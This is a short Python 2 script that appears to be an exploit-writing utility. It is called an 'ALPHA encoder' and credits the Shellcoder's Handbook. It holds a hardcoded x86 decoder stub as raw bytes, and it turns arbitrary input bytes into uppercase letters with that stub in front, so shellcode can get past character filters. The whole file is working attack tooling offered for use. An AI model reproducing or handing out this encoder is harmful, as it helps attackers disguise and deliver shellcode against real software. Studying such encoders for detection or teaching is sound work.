# quine.py by h4lf-jiffie (dohmatob elvis dopgima) a tiny ALPHA encoder
# 4CKNOWLEDGEMENTS:
#    0]-- the shellcoder's handbook

import sys

quine_decoder = (
"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5F\x83\xC7\x1B"
"\x57\x5E\x8A\x07\x2C\x41\xC0\xE0\x04\x47\x02\x07\x2C"
"\x41\x88\x06\x46\x47\x80\x3F\x51\x72\xEB")

def encode(buf):
	encoded_buf = "" 
	for byte in buf:
		byte = ord(byte)
		right = (byte&0xF)+0x41
		left = ((byte&0xF0)>>4)+0x41
		encoded_buf += chr(left)+chr(right)
		
	encoded_buf += "QQ"
	return quine_decoder + encoded_buf
	
if __name__ == '__main__':
	# sanitize command-line
	if len(sys.argv) < 2:
		print "Usage: python [OPTIONS] <string_to_encode>"
		sys.exit(1)

	print encode(sys.argv[1])
	
	

		
	
